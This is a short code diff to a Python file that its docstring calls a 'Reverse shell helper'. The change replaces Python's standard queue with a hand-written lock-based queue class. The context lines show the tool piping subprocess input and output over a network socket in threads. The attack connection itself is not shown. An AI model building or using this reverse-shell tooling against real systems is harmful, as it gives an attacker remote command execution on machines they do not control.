@@ -2,7 +2,6 @@
 """Reverse shell helper."""
 
 import os
-import queue
 import socket
 import sys
 import time
@@ -10,6 +9,39 @@ import threading
 from subprocess import PIPE
 from subprocess import Popen
 from subprocess import STDOUT
+
+
+class MyQueue(object):
+    """Custom queue implementation."""
+
+    def __init__(self):
+        """Constructor."""
+        self.lock = threading.Semaphore()
+        self.data = []
+
+    def qsize(self):
+        """Return queue size."""
+        self.lock.acquire()
+        size = len(self.data)
+        self.lock.release()
+        return size
+
+    def put(self, data):
+        """Add element to queue."""
+        self.lock.acquire()
+        self.data.insert(0, data)
+        self.lock.release()
+
+    def empty(self):
+        """Is the queue empty."""
+        return self.qsize() == 0
+
+    def get(self):
+        """Pop and get last element."""
+        self.lock.acquire()
+        data = self.data.pop()
+        self.lock.release()
+        return data
 
 
 class IOCommand(object):
@@ -153,7 +185,7 @@ def main(argv):
         print("[MODE]: sending suffix2: {}".format(repr(suffix2)))
         s.send(suffix2)
 
-    q = queue.Queue()
+    q = MyQueue()
     t1 = threading.Thread(target=exec_cmd, args=(network.recv, command.input))
     t2 = threading.Thread(target=add_queue, args=(command.output, q))
 
